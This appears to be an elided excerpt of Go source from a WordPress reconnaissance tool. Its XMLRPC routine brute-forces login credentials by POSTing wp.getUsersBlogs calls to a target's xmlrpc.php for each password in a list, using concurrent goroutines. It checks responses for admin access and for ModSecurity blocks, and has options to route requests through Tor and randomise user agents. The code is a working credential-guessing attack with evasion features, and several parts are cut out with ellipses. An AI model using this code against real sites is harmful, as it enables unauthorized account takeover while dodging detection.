...
func XMLRPC() int {
	...
	http := gohttp.HTTPOptions{URL: gohttp.URLOptions{
		Simple: InfosWprecon.Target,
	}, Options: gohttp.Options{
		TLSCertificateVerify: InfosWprecon.OtherInformationsBool["http.options.tlscertificateverify"],
		Tor:                  InfosWprecon.OtherInformationsBool["http.options.tor"],
		RandomUserAgent:      InfosWprecon.OtherInformationsBool["http.options.randomuseragent"]}}
		...
		for key, password := range passwords {
			if !done {
				go func() {
					...
					is, err := xmlrpcSimpleRequest(&http, username, password)
...
func xmlrpcSimpleRequest(http *gohttp.HTTPOptions, username string, password string) (bool, error) {
	http.URL.Directory = "xmlrpc.php"
	http.Method = "POST"

	http.Data = fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, password)
	...
	containsAdminTrue := strings.Contains(response.Raw, "'isAdmin': True")
	...
	if containsModSecurity {
		...
		return false, fmt.Errorf("Oops, I don't know what happened ... but I had an undue return. Status Code: %d", response.StatusCode)
	} else if containsAdminTrue {
		return true, nil
